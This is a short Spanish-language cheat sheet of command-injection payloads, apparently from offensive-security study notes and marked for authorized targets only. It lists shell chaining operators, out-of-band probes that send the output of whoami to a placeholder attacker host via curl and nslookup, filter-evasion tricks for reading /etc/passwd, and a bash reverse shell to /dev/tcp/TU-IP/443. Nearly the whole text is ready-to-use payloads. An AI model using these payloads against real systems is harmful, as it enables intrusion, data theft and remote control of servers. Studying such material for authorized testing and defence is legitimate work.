# Cheatsheet · Command Injection

Explicación en `../../01-web/injection/command-injection.md`. **Solo sobre objetivos autorizados.**

## Operadores de encadenamiento

```bash
; id
| id
|| id
&& id
`id`
$(id)
%0a id          # nueva línea (URL-encoded)
```

## Confirmación out-of-band (blind)

```bash
; ping -c 3 TU-IP
; curl http://TU-IP/$(whoami)
; nslookup `whoami`.TU-DOMINIO
; sleep 5        # time-based
```

## Evasión de filtros

```bash
# espacios
cat${IFS}/etc/passwd
{cat,/etc/passwd}
# partir palabras
w'h'o'am'i
c\at /etc/passwd
# variables vacías
who$@ami
```

## Reverse shell (Linux)

```bash
; bash -c 'bash -i >& /dev/tcp/TU-IP/443 0>&1'
```

## Notas

- Ajusta a Windows (`& whoami`, `| whoami`) si el backend es Windows.
- Sin salida visible → out-of-band o time-based.
